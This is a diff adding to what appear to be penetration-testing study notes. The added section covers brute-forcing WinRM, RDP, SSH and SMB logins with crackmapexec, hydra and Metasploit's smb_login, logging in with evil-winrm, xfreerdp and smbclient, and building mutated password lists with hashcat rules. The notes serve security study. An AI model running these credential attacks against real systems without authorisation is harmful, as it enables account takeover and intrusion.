@@ -117,3 +117,85 @@ $ john --wordlist="rockyou.txt" -serverdocs.hash
 |`hccap2john`|Converts WPA/WPA2 handshake captures for John|
 |`office2john`|Converts MS Office documents for John|
 |`wpa2john`|Converts WPA/WPA2 handshakes for John|
+## Network Service
+n this case, the most common services suitable for this are `RDP`, `WinRM`, and `SSH`.
+### WinRM
+**WinRM** -> Windows Remote Management<br>
+use `crackmapexec` to find username and password
+```shell
+$ crackmapexec winrm <ip address> -u <user or username_list> -p <password or password_list>
+```
+
+```shell
+$ evil-winrm -i <ip_address> -u user -p password
+```
+### RDP
+**RDP** -> Remote Desktop Protocol 
+use `hydra` to find username and password
+```shell
+$ hydra -L <username_list> -P <password_list> rdp://<ip_address>
+## -t 64 to be faster
+```
+
+```shell
+$ xfreerdp /v:<target-IP> /u:<username> /p:<password>
+```
+### SSH
+**SSH** -> Secure Shell
+use hydra to find username and password
+```shell
+$ hydra -L <username_list> -P <password_list> ssh://<ip_adress>
+```
+**Note!** : if it have ftp port 21 use ftp is faster than ssh
+### SMB
+**SMB** -> Server Message Block
+use hydra to find username and password
+```shell
+& hydra -L <username_list> -P <password_list> smb://<ip_address>
+```
+if it error, most likely hydra cannot handle `SMBv3`.<br>
+use msfconsole
+```shell
+$ msf6 > search smb_login
+$ msf6 auxiliary(scanner/smb/smb_login) > set rhosts <target_ip>
+$ msf6 auxiliary(scanner/smb/smb_login) > set user_file <username_list>
+$ msf6 auxiliary(scanner/smb/smb_login) > set pass_file <password_list>
+$ msf6 auxiliary(scanner/smb/smb_login) > exploit
+```
+
+then use smbclient to login
+```shell
+$ smbclint -U username -L \\<ip_address>  # list contents
+$ smbclint -U username \\\\<ip_address>\\<content> # login smb
+```
+## Password Mutations
+|**Function**|**Description**|
+|---|---|
+|`:`|Do nothing.|
+|`l`|Lowercase all letters.|
+|`u`|Uppercase all letters.|
+|`c`|Capitalize the first letter and lowercase others.|
+|`sXY`|Replace all instances of X with Y.|
+|`$!`|Add the exclamation character at the end.|
+use `hashcat` to do it
+```shell
+$ hashcat --force password.list -r custom.rule --stdout > mut_password.list
+```
+#### Hashcat Existing Rules
+```shell
+$ ls /usr/share/hashcat/rules/
+
+best64.rule                  specific.rule
+combinator.rule              T0XlC-insert_00-99_1950-2050_toprules_0_F.rule
+d3ad0ne.rule                 T0XlC-insert_space_and_special_0_F.rule
+dive.rule                    T0XlC-insert_top_100_passwords_1_G.rule
+generated2.rule              T0XlC.rule
+generated.rule               T0XlCv1.rule
+hybrid                       toggles1.rule
+Incisive-leetspeak.rule      toggles2.rule
+InsidePro-HashManager.rule   toggles3.rule
+InsidePro-PasswordsPro.rule  toggles4.rule
+leetspeak.rule               toggles5.rule
+oscommerce.rule              unix-ninja-leetspeak.rule
+rockyou-30000.rule
+```
